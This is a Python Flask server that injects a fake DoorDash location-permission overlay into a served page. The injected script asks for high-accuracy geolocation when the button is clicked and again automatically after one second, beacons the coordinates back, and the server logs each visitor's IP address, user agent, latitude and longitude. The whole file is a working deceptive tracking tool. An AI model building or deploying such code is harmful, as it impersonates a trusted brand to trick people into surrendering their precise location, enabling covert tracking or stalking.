from flask import Flask, request, send_from_directory
import logging
import os

app = Flask(__name__)

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

@app.route('/')
def serve_page():
    # Get client IP address
    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent', 'Unknown')
    
    # Log the IP and user agent
    logger.info(f"Visitor IP: {client_ip}, User Agent: {user_agent}")
    
    # Read your existing page.html
    try:
        with open('page.html', 'r') as f:
            html_content = f.read()
    except FileNotFoundError:
        html_content = "<html><body>Default page - page.html not found</body></html>"
    
    # Inject the permission overlay and tracking script
    overlay_and_script = """
    <style>
        .location-overlay {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0,0,0,0.8);
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 9999;
            color: white;
            text-align: center;
            padding: 20px;
        }
        .location-button {
            background: #FF3008;
            color: white;
            border: none;
            padding: 15px 30px;
            font-size: 18px;
            border-radius: 8px;
            margin-top: 20px;
            cursor: pointer;
        }
    </style>

    <div id="locationOverlay" class="location-overlay">
        <h2>Allow DoorDash to access this device's location?</h2>
        <p>We need your location to provide accurate delivery estimates</p>
        <button id="locationButton" class="location-button">Allow Location Access</button>
    </div>

    <script>
        document.getElementById('locationButton').addEventListener('click', function() {
            requestLocation();
            document.getElementById('locationOverlay').style.display = 'none';
        });

        function requestLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    function(position) {
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        navigator.sendBeacon('/log_location?lat=' + lat + '&lon=' + lon);
                    },
                    function(error) {
                        navigator.sendBeacon('/log_error?code=' + error.code);
                        // Show error message if needed
                        document.getElementById('locationOverlay').innerHTML = `
                            <h2>Location Access Required</h2>
                            <p>Please enable location services in your browser settings</p>
                        `;
                    },
                    {
                        enableHighAccuracy: true,
                        maximumAge: 0,
                        timeout: 15000
                    }
                );
            } else {
                navigator.sendBeacon('/log_error?code=unsupported');
                document.getElementById('locationOverlay').innerHTML = `
                    <h2>Location Not Supported</h2>
                    <p>Your browser doesn't support location services</p>
                `;
            }
        }
        
        // Also try to request on page load as fallback
        setTimeout(requestLocation, 1000);
    </script>
    """
    
    # Insert the overlay and script right before </body>
    modified_html = html_content.replace('</body>', overlay_and_script + '</body>')
    return modified_html

@app.route('/log_location')
def log_location():
    lat = request.args.get('lat', 'unknown')
    lon = request.args.get('lon', 'unknown')
    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    logger.info(f"Location data - IP: {client_ip}, Latitude: {lat}, Longitude: {lon}")
    return '', 204

@app.route('/log_error')
def log_error():
    error_code = request.args.get('code', 'unknown')
    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    logger.info(f"Location error - IP: {client_ip}, Error Code: {error_code}")
    return '', 204

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 10000)))
